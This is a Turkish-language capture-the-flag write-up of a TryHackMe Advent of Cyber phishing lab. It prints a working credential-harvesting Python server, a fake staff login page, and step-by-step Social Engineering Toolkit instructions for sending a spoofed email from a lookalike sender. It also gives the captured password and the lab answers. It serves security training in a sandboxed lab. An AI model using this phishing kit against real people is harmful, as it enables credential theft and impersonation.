+++
title = "THM AoC25-D2 Phishing - Merry Clickmas WriteUp"
date = "2025-12-07"
author = "retake"
description = "TryHackMe AoC25 | Day-2 | Phishing - Merry Clickmas WriteUp"
tags = ["TryHackMe", "TryHackMe-AoC25", "WriteUp"]
+++

Herkese Selamlar, Advent of Cyber'in 2.Günü ile birlikteyiz. Bugün şirketimizin (TBFC) Internal Red Team üyelerine yardımcı olup phishing saldırısı gerçekleştireceğiz. Lab'ın giriş bölümü aşağıdaki gibi görünüyor.



![Lab Girişi](</post-content/AoC-2025-d2/aoc-d2-1.png>)

Ben Attacker machine'yi açmayacağım çünkü vpn'e bağlanıp kendi bilgisayarımdan lab'ı çözmeyi tercih ediyorum.



![Bağlantı Seçenekleri](</post-content/AoC-2025-d2/aoc-d2-2.png>)


Bağlantı testi için saldıracağımız makineye ping atıyorum.

![Bağlantı Testi](</post-content/AoC-2025-d2/aoc-d2-3.png>)

Bağlantımızı sağlıklı bir şekilde kurduk. Şimdi Lab'ın indirmemizi istediği dosyaları indirip çalıştırıyoruz.



![İndirilecek Dosyalar](</post-content/AoC-2025-d2/aoc-d2-4.png>)

## Server'i Hazırlama

Dosya bir zip halinde verilmiş. Dosyayı zip olarak indirip daha sonra aynı klasörde Python HTTP server çalıştırmanızı istiyor. Bu şekilde kendi phishing sayfamıza sahip olacağız.` python3 server.py ` veya `./server.py`  
  
{{< code language="python" title="TryHackMe'nin bize hazırladığı server.py dosyasının içeriği:" isCollapsed="true" >}}
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse, os, sys, datetime

HOST = '0.0.0.0'
PORT = 8000
HERE = os.path.dirname(os.path.abspath(__file__))
CREDS_FILE = os.path.join(HERE, 'creds.txt')
FLAG = "THM{first-phish}"

class H(BaseHTTPRequestHandler):
    def log(self, msg):
        ts = datetime.datetime.now().isoformat(sep=' ', timespec='seconds')
        line = f"[{ts}] {msg}"
        print(line, flush=True)

    def do_GET(self):
        if self.path in ('/', '/index.html'):
            self.send_response(200)
            self.send_header('Content-Type','text/html; charset=utf-8')
            self.end_headers()
            with open(os.path.join(HERE,'index.html'),'rb') as f:
                self.wfile.write(f.read())
            return
        self.send_response(404)
        self.end_headers()

    def do_POST(self):
        if self.path == '/submit':
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length).decode('utf-8')
            data = urllib.parse.parse_qs(body)
            user = data.get('username',[''])[0]
            pw = data.get('password',[''])[0]

            with open(CREDS_FILE, 'a') as fh:
                fh.write(f"{datetime.datetime.now().isoformat()}\t{self.client_address[0]}\t{user}\t{pw}\n")

            self.log(f"Captured -> username: {user}    password: {pw}    from: {self.client_address[0]}")

            self.send_response(303)
            self.send_header('Location', '/')
            self.end_headers()
            return

        self.send_response(404)
        self.end_headers()

if __name__ == '__main__':
    print("Starting server on http://%s:%d" % (HOST, PORT))
    httpd = HTTPServer((HOST, PORT), H)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("Shutting down")
        httpd.server_close()
        sys.exit(0)
{{< /code >}}

Basit bir web server açıp index.html'i hostladığını kaynak koduna bakarak görebiliyoruz. index.html dosyasının içerisinde ise html kaynak kodları mevcut:

{{< code language="html" title="TryHackMe'nin bize hazırladığı index.html dosyasının içeriği:" isCollapsed="true" >}}
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>TBFC — Staff Portal</title>
<style>
  :root{
    --card-bg:#1C2538;
    --page-a:#1C2538;
    --page-b:#1C2538;
    --accent:#A3EA2A;
    --muted:#A3EA2A;
  }
  html,body{height:100%;margin:0;font-family:"Source Sans Pro","Ubuntu",sans-serif;background:#1C2538;color:#A3EA2A}
  .wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:36px;position:relative;overflow:hidden}

  /* subtle snow */
  .snow{pointer-events:none;position:absolute;inset:0;z-index:0}
  .snow i{position:absolute;top:-10%;width:8px;height:8px;border-radius:50%;background:rgba(255,255,255,0.95);box-shadow:0 0 6px rgba(255,255,255,0.12);animation:fall linear infinite;opacity:0.95}
  .snow i:nth-child(1){left:5%;animation-duration:13s}
  .snow i:nth-child(2){left:18%;animation-duration:17s;transform:scale(0.7)}
  .snow i:nth-child(3){left:32%;animation-duration:14s}
  .snow i:nth-child(4){left:46%;animation-duration:20s;transform:scale(0.8)}
  .snow i:nth-child(5){left:60%;animation-duration:18s}
  .snow i:nth-child(6){left:74%;animation-duration:15s;transform:scale(0.6)}
  .snow i:nth-child(7){left:88%;animation-duration:21s}
  @keyframes fall{0%{transform:translateY(-10vh)}100%{transform:translateY(110vh) translateX(30px)}}

  .card{position:relative;z-index:2;background:var(--card-bg);padding:26px;border-radius:12px;box-shadow:0 16px 36px rgba(15,23,42,0.08);width:440px;max-width:96%}
  .header{display:flex;gap:12px;align-items:center;margin-bottom:8px}
  .logo{width:52px;height:52px;border-radius:12px;display:flex;align-items:center;justify-content:center;color:#fff}
  .brand h2{margin:0;font-size:18px}
  .brand p{margin:0;font-size:12px;color:var(--muted)}
  .lead{margin:8px 0 12px;color:#A3EA2A;font-size:13px}
  label{font-size:12px;color:#A3EA2A;display:block;margin-top:6px}
  input{width:100%;padding:11px;margin:8px 0 12px;border:1px solid #e6eef8;border-radius:10px;box-sizing:border-box;font-size:14px}
  button{width:100%;padding:12px;background:linear-gradient(90deg,var(--accent),#06b6d4);color:#fff;border:none;border-radius:10px;cursor:pointer;font-weight:700;font-size:14px;display:inline-flex;align-items:center;justify-content:center;gap:8px}
  button:disabled{opacity:0.85;cursor:not-allowed}
  .meta{display:flex;justify-content:space-between;align-items:center;margin-top:10px}
  .muted{color:var(--muted);font-size:12px}
  .lab-footer{position:relative;z-index:2;margin-top:14px;text-align:center;font-size:11px;color:#6b7280;opacity:0.95}

  /* spinner */
  .spinner{
    width:14px;height:14px;border:2px solid rgba(255,255,255,0.5);border-top-color:#ffffff;border-radius:50%;animation:spin .8s linear infinite;display:inline-block;vertical-align:middle;
  }
  @keyframes spin{to{transform:rotate(360deg)}}

  @media (max-width:520px){.card{padding:18px}.logo{width:46px;height:46px}}
</style>
</head>
<body>
  <div class="wrap" role="main" aria-labelledby="portalTitle">
    <div class="snow" aria-hidden="true">
      <i></i><i></i><i></i><i></i><i></i><i></i><i></i>
    </div>

    <div class="card" aria-describedby="labNote">
      <div class="header">
        <div class="logo" style="background:#1C2538;">
          <!-- inline new icon -->
          <svg width="36" height="36" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Portal">
            <path fill="none" stroke="#A3EA2A" stroke-width="2" d="M12,15.5A3.5,3.5 0 0,1 8.5,12A3.5,3.5 0 0,1 12,8.5A3.5,3.5 0 0,1 15.5,12A3.5,3.5 0 0,1 12,15.5M19.43,12.97C19.47,12.65 19.5,12.33 19.5,12C19.5,11.67 19.47,11.34 19.43,11L21.54,9.37C21.73,9.22 21.78,8.95 21.66,8.73L19.66,5.27C19.54,5.05 19.27,4.96 19.05,5.05L16.56,6.05C16.04,5.66 15.5,5.32 14.87,5.07L14.5,2.42C14.46,2.18 14.25,2 14,2H10C9.75,2 9.54,2.18 9.5,2.42L9.13,5.07C8.5,5.32 7.96,5.66 7.44,6.05L4.95,5.05C4.73,4.96 4.46,5.05 4.34,5.27L2.34,8.73C2.22,8.95 2.27,9.22 2.46,9.37L4.57,11C4.53,11.34 4.5,11.67 4.5,12C4.5,12.33 4.53,12.65 4.57,12.97L2.46,14.63C2.27,14.78 2.22,15.05 2.34,15.27L4.34,18.73C4.46,18.95 4.73,19.03 4.95,18.95L7.44,17.94C7.96,18.34 8.5,18.68 9.13,18.93L9.5,21.58C9.54,21.82 9.75,22 10,22H14C14.25,22 14.46,21.82 14.5,21.58L14.87,18.93C15.5,18.67 16.04,18.34 16.56,17.94L19.05,18.95C19.27,19.03 19.54,18.95 19.66,18.73L21.66,15.27C21.78,15.05 21.73,14.78 21.54,14.63L19.43,12.97Z" />
          </svg>
        </div>

        <div class="brand">
          <h2 id="portalTitle" style="font-weight:normal;">TBFC Staff Portal</h2>
          <p class="muted">SOCMAS Operations — Re-authentication</p>
        </div>
      </div>

      <p class="lead">Please re-authenticate to apply the latest delivery manifest changes.</p>

      <!-- ACTION TARGETS THE LOCAL LAB SERVER -->
      <form id="loginForm" action="/submit" method="post" autocomplete="off" novalidate>
        <input id="u" name="username" placeholder="Email or username" required autocomplete="username" />
        <input id="p" name="password" type="password" placeholder="Password" required autocomplete="current-password" />
        <button id="btn" type="submit" aria-live="polite" style="background:#1C2538;border:2px solid #A3EA2A;color:#A3EA2A;"><span id="btn-text">Sign in</span></button>
      </form>

      <div class="meta">
        <div class="muted">Need help? Contact SOCMAS ops desk</div>
        <div style="font-weight:normal;font-size:10px;color:#A3EA2A">v2.1</div>
      </div>
    </div>
  </div>

<script>
  // UX: show spinner and realistic delay, then perform a real POST to /submit.
  (function(){
    const form = document.getElementById('loginForm');
    const btn = document.getElementById('btn');
    const pwd = document.getElementById('p');

    form.addEventListener('submit', function(e){
      // block default immediate submit so we can show the spinner, but we'll call form.submit()
      e.preventDefault();

      // disable controls, show spinner text
      btn.disabled = true;
      btn.innerHTML = '<span class="spinner" aria-hidden="true"></span> Signing in...';

      // short, believable delay, then submit to /submit
      setTimeout(() => {
        // NOTE: this will perform the real browser POST to /submit (server.py must be running)
        // clear password from DOM immediately after triggering submit to avoid leaving it in UI (browser will send it)
        form.submit();
        // password field will be cleared by server response / page reload. For safety, clear after a tiny delay:
        setTimeout(() => { if (pwd) pwd.value = ''; }, 300);
      }, 700);
    });

    // convenience: Enter in username triggers same UX
    document.getElementById('u').addEventListener('keydown', (ev) => {
      if (ev.key === 'Enter') { ev.preventDefault(); form.dispatchEvent(new Event('submit', {cancelable:true})); }
    });
  })();
</script>
</body>
</html>
{{< /code >}}


Sitenin görünüşü:



![Sitenin Görünüşü](</post-content/AoC-2025-d2/aoc-d2-5.png>)

Tryhackme bize hazır bir phishing sayfası vermiş zaten(`index.html`) ve server kodumuz da mevcut(`server.py`). `index.html` ve `server.py`'yi **aynı klasöre** çıkartıp daha sonra test yapmak amacıyla `server.py`'yi çalıştırıyoruz.

```
python server.py
```

{{< video "/post-content/AoC-2025-d2/AoC-d2-test_video.mp4" >}}

Video'da görebileceğiniz gibi ufak bir testten sonra phishing sitemizin çalıştığını ve giriş bilgilerini alabildiğimizi doğruluyoruz. Şimdi sıra SET(Social Engineering Toolkit) kullanarak kullancılara mail gönderip sahte sitemize girmelerini sağlamak kaldı. Bu süreçte `server.py` **açık kalmalı**.


## Social Engineering Toolkit(SET) Hazırlığı

Öncelikle `setoolkit` komutu ile SET'i açacağız.

![SET](</post-content/AoC-2025-d2/aoc-d2-6.png>)

Sırasıyla:

- <kbd>1</kbd>'e basıp Öncelikle `1) Social-Engineering Attacks` menüsüne.

- Hemen ardından <kbd>5</kbd>'e basarak `5) Mass Mailer Attack` giriyoruz.

- Ardından <kbd>1</kbd>'e basıp `1. E-Mail Attack Single Email Address` saldırısına giriş yapıyoruz.

Bunun ardından;

1. **Send email to** bölümüne `factory@wareville.thm`

2. **Maili nasıl göndereceğimiz bölümünde** ise `Use your own server or open relay` seçeneğini seçeceğiz

3. **From address** bölümüne ise `updates@flyingdeer.thm` adresini gireceğiz. Bu adres kargo şirketinin birlikte çalıştığı şirketlerden birinin mailine benziyor.

4. **From name**'e ise `Flying Deer` ismini gireceğiz.

5. **Username for open-relay**: Bu bölümü boş bırakacağız. Enter'e basmanız yeterli.

6. **Password for open-relay**: Bu bölümü de boş bırakacağız. Enter'e basmanız yeterli.

7. **SMTP email server address** bu bölümde ise şirketin(TBFC) mail sunucunu gireceğiz `10.81.173.15`.

8. **Port number for the SMTP server** bu bölümü default olan `25`'de bırakabiliriz. Enter'e basmanız yeterli.

9. **Flag this message/s as high priority?** Bölümüne de `no` diyeceğiz.

10. **Do you want to attach a file** `no` olacak.

11. **Do you want to attach an inline file** bunu da `no` yapacağız.

Şimdi sıra mail içeriğimizi yazmaya geldi, ingilizce inandırıcı bir metin yazıp şirket çalışanlarını kandırmamız gerekiyor. Ben direkt TryHackMe'nin bize verdiği metni kullanacağım:



![SET Mail Metni](</post-content/AoC-2025-d2/aoc-d2-7.png>)

Benim metnim böyle görünüyor. Phishing için hazırladığımız siteyi eklemeyi unutmayın. VPN kullanıyorsanız adresinizi şu şekilde bulabilirsiniz.

`ifconfig` çıktısındaki `tun0` arayüzünün IP adresi sizin TryHackMe içerisindeki adresiniz oluyor.



![IP Adresi Bulma](</post-content/AoC-2025-d2/aoc-d2-8.png>)

Zaten serverimizi <mark>8000</mark> portunda açmıştık.



Tüm işlemleri tamamladıktan sonra bize credential geliyor.



![Credentials](</post-content/AoC-2025-d2/aoc-d2-9.png>)



![Creds.txt](</post-content/AoC-2025-d2/aoc-d2-10.png>)

**username:** {{< blur >}}admin{{< /blur >}} :**password:** {{< blur >}}unranked-wisdom-anthem{{< /blur >}}



## Soru Çözümleri

### 1) What is the password used to access the TBFC portal?

Yukarıdaki server'den bulduğumuz şifre olan {{< blur >}}unranked-wisdom-anthem{{< /blur >}}

### 2) Browse to `http://10.81.173.15` from within the AttackBox and try to access the mailbox of the `factory` user to see if the previously harvested `admin` password has been reused on the email portal. What is the total number of toys expected for delivery?

Yukarıdaki soruda ilgili adrese gidip email portalında `factory` user'i için kullandığımız şifrenin mail hesabı için ikinci defa kullanılıp kullanılmadığını test etmemizi istiyor. Yukarıda bulduğumuz şifre ile giriş yaptığımızda ise mail kutusu karşımıza çıkıyor.



![Mailcube](</post-content/AoC-2025-d2/aoc-d2-11.png>)

İstediği mail'i açtığımızda ise yanıtımızı görüyoruz:



![Mailcube Mails](</post-content/AoC-2025-d2/aoc-d2-12.png>)

{{< blur >}}`1984000`{{< /blur >}}



![FINISH](</post-content/AoC-2025-d2/aoc-d2-13.png>)

2\.Gün Labımızı da çözmüş olduk. Bir sonraki günde görüşmek üzere!

